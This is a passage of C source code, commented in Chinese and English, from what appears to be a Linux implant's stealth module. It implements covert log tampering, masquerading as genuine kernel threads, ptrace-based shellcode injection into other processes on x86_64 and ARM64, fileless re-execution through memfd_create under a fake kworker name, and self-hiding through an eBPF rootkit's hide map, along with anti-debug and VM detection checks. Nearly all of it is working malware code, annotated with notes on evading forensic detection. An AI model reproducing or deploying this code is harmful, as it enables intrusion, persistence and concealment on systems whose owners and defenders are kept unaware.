                ax_memcpy(buf + at, repl, (size_t)nl);
                at += nl;
            }
        }
        if (consumed > 0) {
            ax_memmove(buf, buf + consumed, (size_t)(len - consumed));
            have = len - consumed;
            base += consumed;
            // 无论上面有没有 seek 过，都把读位置摆回"已消费 + 已缓冲"处
            if (sys_lseek(fd, base + have, AX_SEEK_SET) < 0) break;
        }
        if (eof) break;
    }
    sys_close(fd);
    return hits;
}

// ── 默认日志处理 ──

/// 默认日志处理。**不做"整文件清空"这种高信号动作**。写一行人类可读摘要到 rep。
/// 返回处理过的项数。
int opsec_clean_logs(char *rep, int replen) {
    int n = 0;
    if (rep && replen > 0) rep[0] = '\0';

    // E5：auditd 存活 → 完全不动 audit 日志（次序铁律，见段首注释）。
    int audited = opsec_auditd_alive();

    // E3：journald 轮转 + 清归档。
    int j = opsec_journal_purge();
    if (j > 0) n += j;

    if (rep && replen > 0) {
        char num[16];
        ax_strcpy(rep, "journal archived removed: ");
        ax_itoa(j, num, 10);
        ax_strcat(rep, num);
        ax_strcat(rep, "; auditd ");
        ax_strcat(rep, audited ? "ALIVE -> audit.log untouched" : "not running");
        ax_strcat(rep, "; /var/log left intact (targeted via redact)");
    }
    return n;
}

// ══════════════════════════════════════════════════════════════════════
// B9 — 伪装名策略：只伪装成**本机真实存在**的内核线程（实现）
// ══════════════════════════════════════════════════════════════════════
// 用固定名池的问题：池里的名字在目标机上可能**根本不存在**，而"本机不可能有的
// 内核线程"本身就是异常信号：
//   · migration/1  需要 nr_cpu > 1        （单核机上不存在）
//   · ksoftirqd/3  需要 nr_cpu > 3
//   · kcompactd0   需要 CONFIG_COMPACTION
//   · rcu_sched    较新内核已改名 rcu_preempt / rcuog / rcuop
// 判据用「**cmdline 为空**」—— 这正是 `ps` 判定内核线程、并回退到 comm 补方括号
// 显示的同一观测。所以选中的名字在 ps 里与真身逐字节同形，且**必定真实存在**。
// 顺带收益：不再依赖固定池 → 无固定 IOC，且随目标内核自适应。

#define AX_KTH_MAX 32

struct ax_kth { char names[AX_KTH_MAX][16]; int n; };

static int ax_kth_cb(const char *nm, void *ctx) {
    struct ax_kth *k = (struct ax_kth *)ctx;
    if (k->n >= AX_KTH_MAX) return 1;               // 够了，提前收工

    int pid = 0;                                    // 只看 /proc/<pid> 数字目录
    for (const char *q = nm; *q; q++) {
        if (*q < '0' || *q > '9') return 0;
        pid = pid * 10 + (*q - '0');
        if (pid > 0x7ffffff) return 0;
    }
    if (pid <= 0) return 0;

    char p[48], b[16];
    ax_snprintf(p, sizeof(p), "/proc/%d/cmdline", pid);   // 内核线程：存在但读回 0 字节
    int fd = sys_open(p, O_RDONLY, 0);
    if (fd < 0) return 0;
    long r = sys_read(fd, b, sizeof(b));
    sys_close(fd);
    if (r != 0) return 0;                           // 非空 = 用户态进程（含本进程）

    ax_snprintf(p, sizeof(p), "/proc/%d/comm", pid);
    int cn = read_file(p, b, sizeof(b) - 1);
    if (cn <= 0 || cn >= (int)sizeof(b)) return 0;  // comm 上限 15 字节，超了不正常
    while (cn > 0 && (b[cn - 1] == '\n' || b[cn - 1] == ' ' || b[cn - 1] == '\t')) b[--cn] = '\0';
    if (cn <= 0) return 0;

    for (int i = 0; i < k->n; i++)                  // 同名只收一次（每个 CPU 都有 kworker）
        if (ax_strcmp(k->names[i], b) == 0) return 0;
    ax_memcpy(k->names[k->n], b, (size_t)cn + 1);
    k->n++;
    return 0;
}

/// 从本机**真实存在**的内核线程里随机取一个名字，写进 out（outsz ≥ 16）。
/// 成功返回 1。
static int opsec_kthread_name(char *out, size_t outsz) {
    if (!out || outsz < 16) return 0;
    out[0] = '\0';
    struct ax_kth k;                                 // 32*16 = 512B 栈，可接受
    k.n = 0;
    if (ax_readdir("/proc", ax_kth_cb, &k) < 0 || k.n == 0) return 0;

    uint8_t r[2];
    if (ax_random_bytes(r, sizeof(r)) != 0) { r[0] = (uint8_t)k.n; r[1] = 0; }
    unsigned idx = (unsigned)((r[0] | ((unsigned)r[1] << 8)) % (unsigned)k.n);
    size_t l = ax_strlen(k.names[idx]);
    if (l == 0 || l >= outsz) return 0;
    ax_memcpy(out, k.names[idx], l + 1);
    return 1;
}

// ══════════════════════════════════════════════════════════════════════
// Process Injection via ptrace
// ══════════════════════════════════════════════════════════════════════

#ifdef ARCH_X86_64

// x86_64 user_regs_struct (simplified)
struct user_regs {
    uint64_t r15, r14, r13, r12, rbp, rbx, r11, r10;
    uint64_t r9, r8, rax, rcx, rdx, rsi, rdi, orig_rax;
    uint64_t rip, cs, eflags, rsp, ss, fs_base, gs_base;
    uint64_t ds, es, fs, gs;
};

int opsec_inject_ptrace(int target_pid, const uint8_t *shellcode, size_t sc_len) {
    if (!shellcode || sc_len == 0) return -1;

    // 1. Attach to target
    if (sys_ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) < 0)
        return -1;

    // Wait for target to stop
    int wstatus = 0;
    sys_wait4(target_pid, &wstatus, 0, NULL);

    // 2. Get current registers
    struct user_regs regs;
    if (sys_ptrace(PTRACE_GETREGS, target_pid, NULL, &regs) < 0) {
        sys_ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return -1;
    }

    // 3. Find writable region in target via /proc/PID/maps
    // Look for an anonymous RW mapping (e.g. heap or stack) to write shellcode
    char maps_path[64];
    char pid_str[16];
    ax_itoa(target_pid, pid_str, 10);
    ax_strcpy(maps_path, "/proc/");
    ax_strcat(maps_path, pid_str);
    ax_strcat(maps_path, "/maps");

    char maps_buf[8192];
    int maps_len = read_file(maps_path, maps_buf, sizeof(maps_buf));
    if (maps_len <= 0) {
        sys_ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return -1;
    }

    // Parse maps looking for an executable region to inject into.
    // Priority: 1) r-xp (code section — POKETEXT bypasses page protections)
    //           2) rwxp (rare but ideal)
    //           3) fallback to current RIP
    // Writing into r-xp via POKETEXT works because ptrace operates at
    // the kernel level, bypassing page permission checks. The page is
    // already executable so the target can run the shellcode directly.
    uint64_t inject_addr = 0;
    char *line = maps_buf;
    while (*line) {
        // Format: "addr1-addr2 perms offset dev inode pathname"
        uint64_t addr1 = 0, addr2 = 0;
        char *p = line;
        while (*p && *p != '-') {
            char c = *p;
            if (c >= '0' && c <= '9') addr1 = (addr1 << 4) | (uint64_t)(c - '0');
            else if (c >= 'a' && c <= 'f') addr1 = (addr1 << 4) | (uint64_t)(c - 'a' + 10);
            p++;
        }
        if (*p == '-') p++;
        while (*p && *p != ' ') {
            char c = *p;
            if (c >= '0' && c <= '9') addr2 = (addr2 << 4) | (uint64_t)(c - '0');
            else if (c >= 'a' && c <= 'f') addr2 = (addr2 << 4) | (uint64_t)(c - 'a' + 10);
            p++;
        }
        if (*p == ' ') p++;
        // Read perms (4 chars: r-xp, rwxp, rw-p, etc.)
        if (p[0] == 'r' && p[2] == 'x' && p[3] == 'p') {
            // r-xp or rwxp — executable region
            uint64_t region_size = addr2 - addr1;
            if (region_size > sc_len + 0x200) {
                // Inject near the end of .text to minimize disruption
                inject_addr = addr2 - sc_len - 0x100;
                // Align to 16
                inject_addr &= ~(uint64_t)0xF;
                break;
            }
        }
        // Next line
        while (*line && *line != '\n') line++;
        if (*line == '\n') line++;
    }

    if (inject_addr == 0) {
        // Fallback: use RIP-relative (inject at current RIP position)
        inject_addr = regs.rip;
    }

    // 4. Write shellcode via POKETEXT (8 bytes at a time)
    for (size_t i = 0; i < sc_len; i += 8) {
        uint64_t word = 0;
        size_t chunk = sc_len - i;
        if (chunk > 8) chunk = 8;

        // If less than 8 bytes, read existing word first to preserve trailing bytes
        if (chunk < 8) {
            long existing = sys_ptrace(PTRACE_PEEKTEXT, target_pid,
                                       (void *)(inject_addr + i), NULL);
            word = (uint64_t)existing;
        }

        ax_memcpy(&word, shellcode + i, chunk);
        if (sys_ptrace(PTRACE_POKETEXT, target_pid,
                       (void *)(inject_addr + i), (void *)word) < 0) {
            sys_ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
            return -1;
        }
    }

    // 5. Set RIP to our shellcode
    regs.rip = inject_addr;
    sys_ptrace(PTRACE_SETREGS, target_pid, NULL, &regs);

    // 6. Detach — target resumes at our shellcode
    sys_ptrace(PTRACE_DETACH, target_pid, NULL, NULL);

    return 0;
}

#elif defined(ARCH_AARCH64)

// ARM64 user_regs_struct
struct user_regs {
    uint64_t regs[31];  // x0-x30
    uint64_t sp;
    uint64_t pc;
    uint64_t pstate;
};

// ARM64 uses PTRACE_GETREGSET / PTRACE_SETREGSET with NT_PRSTATUS
// But some kernels support GETREGS/SETREGS too. Use raw ptrace.
#define PTRACE_GETREGSET 0x4204
#define PTRACE_SETREGSET 0x4205
#define NT_PRSTATUS      1

struct iovec_t {
    void   *iov_base;
    size_t  iov_len;
};

int opsec_inject_ptrace(int target_pid, const uint8_t *shellcode, size_t sc_len) {
    if (!shellcode || sc_len == 0) return -1;

    // 1. Attach
    if (sys_ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) < 0)
        return -1;

    int wstatus = 0;
    sys_wait4(target_pid, &wstatus, 0, NULL);

    // 2. Get registers via GETREGSET
    struct user_regs regs;
    struct iovec_t iov;
    iov.iov_base = &regs;
    iov.iov_len = sizeof(regs);

    if (sys_ptrace(PTRACE_GETREGSET, target_pid, (void *)(long)NT_PRSTATUS, &iov) < 0) {
        sys_ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return -1;
    }

    // 3. Find writable region
    char maps_path[64];
    char pid_str[16];
    ax_itoa(target_pid, pid_str, 10);
    ax_strcpy(maps_path, "/proc/");
    ax_strcat(maps_path, pid_str);
    ax_strcat(maps_path, "/maps");

    char maps_buf[8192];
    int maps_len = read_file(maps_path, maps_buf, sizeof(maps_buf));
    uint64_t inject_addr = 0;

    if (maps_len > 0) {
        // Find r-xp or rwxp region (executable) — POKETEXT bypasses page protections
        char *line = maps_buf;
        while (*line) {
            uint64_t addr1 = 0, addr2 = 0;
            char *p = line;
            while (*p && *p != '-') {
                char c = *p;
                if (c >= '0' && c <= '9') addr1 = (addr1 << 4) | (uint64_t)(c - '0');
                else if (c >= 'a' && c <= 'f') addr1 = (addr1 << 4) | (uint64_t)(c - 'a' + 10);
                p++;
            }
            if (*p == '-') p++;
            while (*p && *p != ' ') {
                char c = *p;
                if (c >= '0' && c <= '9') addr2 = (addr2 << 4) | (uint64_t)(c - '0');
                else if (c >= 'a' && c <= 'f') addr2 = (addr2 << 4) | (uint64_t)(c - 'a' + 10);
                p++;
            }
            if (*p == ' ') p++;
            if (p[0] == 'r' && p[2] == 'x' && p[3] == 'p') {
                uint64_t region_size = addr2 - addr1;
                if (region_size > sc_len + 0x200) {
                    inject_addr = addr2 - sc_len - 0x100;
                    inject_addr &= ~(uint64_t)0xF;
                    break;
                }
            }
            while (*line && *line != '\n') line++;
            if (*line == '\n') line++;
        }
    }

    if (inject_addr == 0) {
        inject_addr = regs.pc;
    }

    // 4. Write shellcode via POKETEXT
    for (size_t i = 0; i < sc_len; i += 8) {
        uint64_t word = 0;
        size_t chunk = sc_len - i;
        if (chunk > 8) chunk = 8;

        if (chunk < 8) {
            long existing = sys_ptrace(PTRACE_PEEKTEXT, target_pid,
                                       (void *)(inject_addr + i), NULL);
            word = (uint64_t)existing;
        }

        ax_memcpy(&word, shellcode + i, chunk);
        if (sys_ptrace(PTRACE_POKETEXT, target_pid,
                       (void *)(inject_addr + i), (void *)word) < 0) {
            sys_ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
            return -1;
        }
    }

    // 5. Set PC to our shellcode
    regs.pc = inject_addr;
    iov.iov_base = &regs;
    iov.iov_len = sizeof(regs);
    sys_ptrace(PTRACE_SETREGSET, target_pid, (void *)(long)NT_PRSTATUS, &iov);

    // 6. Detach
    sys_ptrace(PTRACE_DETACH, target_pid, NULL, NULL);

    return 0;
}

#endif // ARCH_X86_64 / ARCH_AARCH64

// ══════════════════════════════════════════════════════════════════════
// Fileless self-re-exec via memfd_create
// ══════════════════════════════════════════════════════════════════════

int opsec_migrate_memfd(char **argv, char **envp) {
    // 1. Read our own binary from /proc/self/exe
    char _path_exe[64];
    DEOBF(OBF_PROC_SELF_EXE, _path_exe);
    int src_fd = sys_open(_path_exe, O_RDONLY, 0);
    if (src_fd < 0) return -1;

    // Get size via stat
    struct linux_stat st;
    if (sys_fstat(src_fd, &st) < 0) {
        sys_close(src_fd);
        return -1;
    }

    size_t exe_size = (size_t)st.st_size;
    if (exe_size == 0 || exe_size > 100 * 1024 * 1024) {
        sys_close(src_fd);
        return -1;  // Sanity check: max 100MB
    }

    // 2. Create anonymous fd via memfd_create
    //    Name is randomised (§3.2): the old "" produced "/memfd: (deleted)" in
    //    /proc/<pid>/maps — a stable, greppable signature of this technique.
    int mem_fd = AxMemfdCreateRandom(MFD_CLOEXEC);
    if (mem_fd < 0) {
        sys_close(src_fd);
        return -1;
    }

    // 3. Copy binary to memfd
    uint8_t copy_buf[4096];
    size_t remaining = exe_size;
    while (remaining > 0) {
        size_t chunk = remaining > sizeof(copy_buf) ? sizeof(copy_buf) : remaining;
        long n = sys_read(src_fd, copy_buf, chunk);
        if (n <= 0) {
            sys_close(src_fd);
            sys_close(mem_fd);
            return -1;
        }
        if (write_all(mem_fd, copy_buf, (size_t)n) != 0) {
            sys_close(src_fd);
            sys_close(mem_fd);
            return -1;
        }
        remaining -= (size_t)n;
    }
    sys_close(src_fd);

    // 4. Build /proc/self/fd/N path for execve
    char fd_path[64];
    ax_strcpy(fd_path, "/proc/self/fd/");
    char fd_str[16];
    ax_itoa(mem_fd, fd_str, 10);
    ax_strcat(fd_path, fd_str);

    // 5. execve from memfd — replaces current process
    // If argv is NULL, use a minimal argv
    char *default_argv[] = { (char*)"[kworker/0:1-events]", NULL };
    char *default_envp[] = { NULL };

    sys_execve(fd_path,
               argv ? argv : default_argv,
               envp ? envp : default_envp);

    // If we get here, execve failed
    sys_close(mem_fd);
    return -1;
}

// ══════════════════════════════════════════════════════════════════════
// B10 — 自隐藏：把自身 pid 写进 rootkit 的 hide_names（方案 §3.4 B10 / 门 S2）
// ══════════════════════════════════════════════════════════════════════
//
// 缺口：P1 之后 comm / cmdline / cwd / exe 四项都不再泄漏（p11 已验），但 **/proc 的
// 目录项本身（纯数字 pid）仍然一一列出** —— 对手一条 `ls /proc` 就看出"多了一个进程"，
// 而它既没有 comm 也没有 cmdline 可看，反而比普通进程更可疑。hide_names 是这套 rootkit
// 里**唯一**能改这件事的机制（hide.c 挂 sys_exit_getdents64，按 dirent 名匹配）。
//
// 为什么必须由 agent 自己做：hide 条目活在**内核 map** 里。agent 每次重启都要重加；
// rootkit unload→load 也会把 map 清空。靠操作员手动 hide_add 等于每次重启都留一个
// "忘了补"的窗口 —— 这件事天然属于 agent 自己的生命周期。
//
// 身份判据（写错 map = 往别人的数据结构里塞垃圾，必须先自证）：
//   pin 名 `*_map0`（ebpf_load 的 pin 约定） + BPF_OBJ_GET_INFO_BY_FD 自校验
//   type == HASH(1) && key_size == 64 && value_size == 1
//   && name ∈ {"", "hide_names", "ax_m*"}
// 64 字节 key / 1 字节 value 这个组合在本项目里只有 hide_names 一个生产者；
// name 字段实测可读（内核在 map_info 偏移 24 处回填，定点实验 hexdump 确认）。
// **两个合法来源**：ebpf_load 按 `<pin>_map0` 建出来的名字是 `ax_m0`
// （bofs/ebpf_load.c:163 用索引拼名，不是 "hide_names"），手动/hide_add 建的才叫
// "hide_names" —— 两者都放行，硬比其一就是 B10 静默失效的老 bug。
//
// info_len 只声明到 name 为止（40 字节）：内核按 min(info_len, sizeof(info)) 拷贝，
// 40 在任何版本上都安全；而传满结构体在更老的内核上会 E2BIG（本机实测 len=96 → E2BIG）。
//
// 已知代价（**不是 bug**）：hide_names 无目录限定 —— 写进去的 "94777" 会让**任何**目录下
// 叫 "94777" 的条目一并从枚举里消失。pid 十进制串撞名的概率极低，但这是该机制的固有代价
// （p13 T4 断言并记录）。另：hide 只挡**枚举**、不挡 open —— `cat /proc/<pid>/status` 照样读得到
// （陷阱 1），门 S2 的语义就是"`ls /proc` 看不见"。

#define AX_HIDE_KEYLEN  64

#define AX_BPF_MAP_LOOKUP_ELEM    1
#define AX_BPF_MAP_UPDATE_ELEM    2
#define AX_BPF_OBJ_GET            7
#define AX_BPF_OBJ_GET_INFO_BY_FD 15
#define AX_BPF_MAP_TYPE_HASH      1
// id 枚举用。命令号按 /usr/include/linux/bpf.h 的 enum bpf_cmd **顺序**核对过，不凭记忆：
// MAP_CREATE=0 LOOKUP=1 UPDATE=2 DELETE=3 GET_NEXT_KEY=4 PROG_LOAD=5 OBJ_PIN=6 OBJ_GET=7
// PROG_ATTACH=8 PROG_DETACH=9 PROG_TEST_RUN=10 PROG_GET_NEXT_ID=11 MAP_GET_NEXT_ID=12
// PROG_GET_FD_BY_ID=13 MAP_GET_FD_BY_ID=14 OBJ_GET_INFO_BY_FD=15（与上面的 15 互相印证）。
#define AX_BPF_MAP_GET_NEXT_ID    12
#define AX_BPF_MAP_GET_FD_BY_ID   14

// 两个命令的 attr **前 8 字节形状相同**（偏移 0 = id，偏移 4 = 出参 next_id），一个结构体够用：
//   MAP_GET_NEXT_ID : { __u32 start_id; __u32 next_id; __u32 open_flags; __u32 :32; }
//   MAP_GET_FD_BY_ID: { __u32 id;       __u32 next_id; }
// 长度仍按 32B 给足 —— attr 宁宽不窄：16B 的 DELETE attr 曾静默 EINVAL（ISS-064）。
struct ax_bpf_attr_id {
    unsigned int  start_id;       // 同时充当 GET_FD_BY_ID 的 id 字段（偏移相同，见上）
    unsigned int  next_id;
    unsigned int  open_flags;
    unsigned int  pad0;
    unsigned long pad1[2];
};

struct ax_bpf_attr_obj {          // BPF_OBJ_GET
    unsigned long pathname;
    unsigned int  bpf_fd;
    unsigned int  file_flags;
};

struct ax_bpf_attr_elem {         // MAP_LOOKUP_ELEM / MAP_UPDATE_ELEM
    unsigned long map_fd;         // u32 + pad；高位恒 0，与 hide_add.c 同款写法
    unsigned long key;
    unsigned long value;
    unsigned long flags;
};

struct ax_bpf_attr_info {         // BPF_OBJ_GET_INFO_BY_FD
    unsigned int  bpf_fd;
    unsigned int  info_len;
    unsigned long info;
};

struct ax_bpf_map_info {          // 只声明到 name（40B），见上方 info_len 说明
    unsigned int type;
    unsigned int id;
    unsigned int key_size;
    unsigned int value_size;
    unsigned int max_entries;
    unsigned int map_flags;
    char         name[16];
};

/// 构造 hide_names 的 key：自身 pid 的十进制串，**整块清零后**拷入（NUL 填充到满 64）。
/// 必须整块清零 —— hide.c 侧是「预清零缓冲 + 批量拷 nlen 字节」，key 里多一个非零字节
/// 或短一个字节都会与它失配、**静默不隐藏**（hide_add.c 函数头同款约定）。
static void ax_hide_key(char *key) {
    ax_memset(key, 0, AX_HIDE_KEYLEN);
    long pid = sys_getpid();
    char rev[16];
    int r = 0;
    if (pid <= 0) { rev[r++] = '0'; }
    else { while (pid > 0 && r < 15) { rev[r++] = (char)('0' + (int)(pid % 10)); pid /= 10; } }
    int n = 0;
    while (r > 0 && n < AX_HIDE_KEYLEN - 1) key[n++] = rev[--r];
    // 余下字节保持全零 —— 不做任何额外终止处理
}

struct ax_hide_scan { int hits; };

/// 单个 map fd 的**身份判定 + 写入**。两条发现通道（id 枚举 / 目录扫 pin）共用这一份，
/// 保证换通道不会悄悄换判据 —— 判据被掏空是最阴的失效形态：测试照样绿，什么都没测（ISS-065）。
/// 返回非 0 = 这个 fd 是 hide_names 且已生效（已在 / 已写入）。
static int ax_hide_try_fd(int mfd, struct ax_hide_scan *s) {
    // ③ 自校验身份
    struct ax_bpf_map_info mi;
    ax_memset(&mi, 0, sizeof(mi));
    struct ax_bpf_attr_info ia;
    ax_memset(&ia, 0, sizeof(ia));
    ia.bpf_fd   = (unsigned int)mfd;
    ia.info_len = (unsigned int)sizeof(mi);
    ia.info     = (unsigned long)&mi;
    if (AxBpf(AX_BPF_OBJ_GET_INFO_BY_FD, &ia, sizeof(ia)) < 0) return 0;
    if (mi.type != AX_BPF_MAP_TYPE_HASH ||
        mi.key_size != AX_HIDE_KEYLEN || mi.value_size != 1) return 0;
    // ②b 名字白名单。**不要硬比单个 "hide_names"** —— ebpf_load 建 map 时按
    // `<pin>_map0` → 名字是 `ax_m0`（bofs/ebpf_load.c:163 按索引命名），
    // 硬比会让三元组全对却静默拒绝（B10 曾因此从头到尾没生效过一次）。
    // 两种来源都放行：ebpf_load 的 `ax_m*` 约定、手动/hide_add 建的 `hide_names`。
    // name 全空（老内核不填该字段）→ 退化为三元组判据，与旧行为一致。
    if (mi.name[0]) {
        const char *p1 = "hide_names", *p2 = "ax_m";
        int ok = 1;
        for (int i = 0; p1[i]; i++) if (mi.name[i] != p1[i]) { ok = 0; break; }
        if (!ok) {
            ok = 1;
            for (int i = 0; p2[i]; i++) if (mi.name[i] != p2[i]) { ok = 0; break; }
        }
        if (!ok) return 0;
    }

    // ④ 查 → 缺则写（查是只读的，先查后写避免无谓的 map 写事件）
    char key[AX_HIDE_KEYLEN];
    ax_hide_key(key);
    unsigned char val = 0;
    struct ax_bpf_attr_elem ea;
    ax_memset(&ea, 0, sizeof(ea));
    ea.map_fd = (unsigned long)mfd;
    ea.key    = (unsigned long)key;
    ea.value  = (unsigned long)&val;
    if (AxBpf(AX_BPF_MAP_LOOKUP_ELEM, &ea, sizeof(ea)) == 0) { s->hits++; return 1; }
    val = 1;
    if (AxBpf(AX_BPF_MAP_UPDATE_ELEM, &ea, sizeof(ea)) == 0) { s->hits++; return 1; }
    return 0;
}

/// 通道 A（主路）：内核 id 枚举。**不看目录** —— P8 §6c 之后 pin 名本身被隐藏，
/// 目录扫会直接扫空，B10 静默写 0 个 map（p13 回归 6/8 的根因）。
/// 顺带把「没被 pin 的 rootkit」也覆盖了：旧实现只能发现 /sys/fs/bpf 下 pin 过的 map。
/// 循环次数上限 1024 是**map 条数**上限（不是 id 上限，start_id 是游标）：正常内核靠
/// GET_NEXT_ID 返回 ENOENT 自然结束，这个上限只是防「不前进」的死循环。
static int ax_hide_ids(struct ax_hide_scan *s) {
    unsigned int last = 0;
    for (int guard = 0; guard < 1024; guard++) {
        struct ax_bpf_attr_id a;
        ax_memset(&a, 0, sizeof(a));
        a.start_id = last;
        if (AxBpf(AX_BPF_MAP_GET_NEXT_ID, &a, sizeof(a)) < 0) break;  // ENOENT = 到头了
        if (a.next_id == 0 || a.next_id <= last) break;              // 防不前进
        last = a.next_id;

        struct ax_bpf_attr_id b;
        ax_memset(&b, 0, sizeof(b));
        b.start_id = last;                   // ★ 输入在**偏移 0**：GET_FD_BY_ID 的 `__u32 id` 与
                                             // GET_NEXT_ID 的 `__u32 start_id` 是同一个槽位。
                                             // **实测**（tools/idprobe.py，零副作用）：放偏移 0 → fd=3；
                                             // 放偏移 4 → fd=-1/ENOENT。写错的症状是**静默不生效**
                                             // （mfd<0 → continue，没有回执），与"这台机器没有 rootkit"同形。
        long mfd = AxBpf(AX_BPF_MAP_GET_FD_BY_ID, &b, sizeof(b));
        // fd<=0 必须跳过**且不能关**：bpf_filter 会把已隐藏对象的 id 回写成 0，
        // 而 0 是 stdin —— 关掉它会连累本进程后续所有输出。这条路径现在常态可达。
        if (mfd <= 0) continue;
        ax_hide_try_fd((int)mfd, s);
        sys_close((int)mfd);
    }
    return s->hits;
}

/// 通道 B（兜底）：对 /sys/fs/bpf 下每个条目尝试一次。返回非 0 = 提前结束（恒 0）。
/// 保留它的理由：老内核没有 MAP_GET_NEXT_ID、或 id 通道被 bpf_filter 过滤掉时仍有路可走。
static int ax_hide_cb(const char *nm, void *ctx) {
    struct ax_hide_scan *s = (struct ax_hide_scan *)ctx;

    // ① pin 约定：ebpf_load 把 map0 固定在 /sys/fs/bpf/<pin>_map0
    int l = ax_strlen(nm);
    if (l <= 5) return 0;
    const char *suf = "_map0";
    for (int i = 0; i < 5; i++) if (nm[l - 5 + i] != suf[i]) return 0;

    char path[192];
    ax_snprintf(path, sizeof(path), "/sys/fs/bpf/%s", nm);

    // ② 打开被 pin 的 map
    struct ax_bpf_attr_obj ga;
    ax_memset(&ga, 0, sizeof(ga));
    ga.pathname = (unsigned long)path;
    long mfd = AxBpf(AX_BPF_OBJ_GET, &ga, sizeof(ga));
    if (mfd <= 0) return 0;                  // pin 不是 map（_prog 已被 ① 排除）；0=stdin 不碰

    ax_hide_try_fd((int)mfd, s);
    sys_close((int)mfd);
    return 0;
}

/// B10：把自身 pid 写进所有可识别的 hide_names。返回生效的 map 数。
/// 0 = 没有可用的 rootkit（pin 不存在 / 都不匹配）—— **不是错误**，只是无从隐藏。
///
/// 通道顺序 id → 目录，两条共用 ax_hide_try_fd（判据只有一份）。id 通道是主路：
/// §6c 之后 pin 名不可见，目录扫会扫空；且 id 通道顺带覆盖没 pin 的 rootkit。
int opsec_hide_self(void) {
    struct ax_hide_scan s;
    s.hits = 0;
    ax_hide_ids(&s);
    if (s.hits == 0) {
        struct ax_hide_scan d;
        d.hits = 0;
        if (ax_readdir("/sys/fs/bpf", ax_hide_cb, &d) == 0) s.hits = d.hits;
    }
    return s.hits;
}

/// B10 周期闸门。成功一次即**永久静默**（重写同一个 key 是无意义的 map 写事件）；
/// 失败按 15s→300s 指数退避 —— rootkit 完全可能**后于** agent 加载（操作员先起会话
/// 再 load 是常态），所以"失败即放弃"会让 B10 只在理想时序下生效。但也不能每 3 秒
/// 扫一次 /sys/fs/bpf：那本身就是一个稳定的周期性行为特征。
void opsec_hide_self_tick(void) {
    static int      done = 0;
    static uint64_t next_ms = 0;
    static uint32_t backoff = 0;
    if (done) return;
    uint64_t now = ax_monotonic_ms();
    if (now < next_ms) return;
    if (opsec_hide_self() > 0) { done = 1; return; }
    backoff = backoff ? (backoff < 300000U ? backoff * 2U : 300000U) : 15000U;
    next_ms = now + backoff;
}

// ══════════════════════════════════════════════════════════════════════
// Combined Check
// ══════════════════════════════════════════════════════════════════════

int opsec_check(void) {
    // Anti-debug is blocking
    if (opsec_anti_debug() != 0) return -1;

    // VM detection is blocking
    if (opsec_vm_detect() != 0) return -1;

    // Container detection is informational — don't block
    // opsec_container_detect();

    // eBPF detection is informational — >5 monitors is suspicious but not blocking
    // int ebpf = opsec_ebpf_detect();
    // if (ebpf > 5) return -1;  // Uncomment for paranoid mode

    return 0;
}
